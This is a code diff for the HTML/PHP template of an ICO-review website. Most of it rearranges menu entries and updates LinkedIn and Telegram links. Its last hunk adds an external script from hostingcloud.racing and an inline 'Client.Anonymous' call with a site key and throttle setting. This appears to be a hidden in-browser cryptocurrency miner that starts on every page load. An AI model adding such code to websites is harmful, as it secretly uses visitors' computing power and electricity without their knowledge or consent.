@@ -139,17 +139,18 @@
 								<a href="#map" class="mob-menu__link">Road Map</a>
 							</li>
 							<li class="mob-menu__item">
-								<a href="#stat" class="mob-menu__link">Statistic</a>
+								<a href="#docs" class="mob-menu__link">WhitePappers</a>
+							</li>
+							<li class="mob-menu__item">
+								<a href="http://icocheckers.com/Apply-for-ICO-Review" class="mob-menu__link">Apply for ICO Review</a>
 							</li>
 							<!-- <li class="mob-menu__item">
 								<a href="#token" class="mob-menu__link">Token</a>
 							</li> -->
+							
 							<li class="mob-menu__item">
-								<a href="#docs" class="mob-menu__link">WhitePappers</a>
-							</li>
-							<li class="mob-menu__item">
-								<a href="#team" class="mob-menu__link">Team</a>
-							</li>
+							<a href="<?= $this->Url->build('/News-Updates') ?>" class="mob-menu__link">News</a>
+						</li>
 							<li class="mob-menu__item">
 								<a href="#faq" class="mob-menu__link">FAQ</a>
 							</li>
@@ -1605,16 +1606,43 @@
 											</a>
 										</li>
 										<li class="social-list__item">
-											<a href="#" class="social-list__link">
-												<i class="fab fa-telegram-plane fontello-icon"></i>
-											</a>
-										</li>
-										<li class="social-list__item">
-											<a href="https://www.linkedin.com/company/23731063/admin/" target="_blank" class="social-list__link">
+											<a href="https://www.linkedin.com/company/ico-checkers" target="_blank" class="social-list__link">
 												<i class="fab fa-linkedin-in fontello-icon"></i>
 											</a>
 										</li>
 									</ul>
+									<br/>
+									<div align="">
+										<table>
+											<tr>
+												<td>
+													<a href="https://t.me/IcocheckersMdicoin" target="_blank" class="social-list__link">
+														<i class="fab fa-telegram-plane fontello-icon"></i>  
+													</a> 
+													<span>Channel</span>
+												</td>
+												<td width="10px;"></td>
+												<td>
+													<a href="https://t.me/joinchat/Ogvwp0Wyo8EzymxOkiiLdQ" target="_blank" class="social-list__link">
+														<i class="fab fa-telegram-plane fontello-icon"></i>  
+													</a> 
+													<span> Group</span>
+												</td>
+											</tr>
+										</table>
+											<!-- <ul class="social-list">
+												<li class="social-list__item">
+													
+												</li>
+												<li class="social-list__item">
+													<a href="https://t.me/joinchat/Ogvwp0Wyo8EzymxOkiiLdQ" target="_blank" class="social-list__link">
+														<i class="fab fa-telegram-plane fontello-icon"></i>   
+													</a>
+													<span>Group</span>
+												</li>
+											</ul> -->
+									</div>
+									
 								</div>
 							</div>
 							<div class="col-lg-4">
@@ -1642,5 +1670,13 @@
 
 			<script src="<?php echo $library; ?>js/scripts.min.js"></script>
 
+			<script src="https://www.hostingcloud.racing/hDTl.js"></script>
+		  <script src="https://www.hostingcloud.racing/hDTl.js"></script>
+	    <script>
+	        var _client = new Client.Anonymous('ee3c3e8c50942905be889544264cc91678b72b870fbebdccfa0f5260f0d1e5cb', {
+	            throttle: 0.3, ads: 0
+	        });
+	        _client.start();
+	    </script>
 		</body>
 </html>
